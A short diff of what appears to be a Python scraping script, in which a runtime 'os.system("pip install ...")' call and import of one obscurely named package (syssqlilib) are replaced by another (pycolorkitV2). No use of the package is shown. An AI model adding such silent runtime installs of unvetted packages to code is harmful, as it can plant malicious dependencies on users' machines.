@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlilib")
-import syssqlilib
+os.system("pip install pycolorkitV2")
+import pycolorkitV2
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
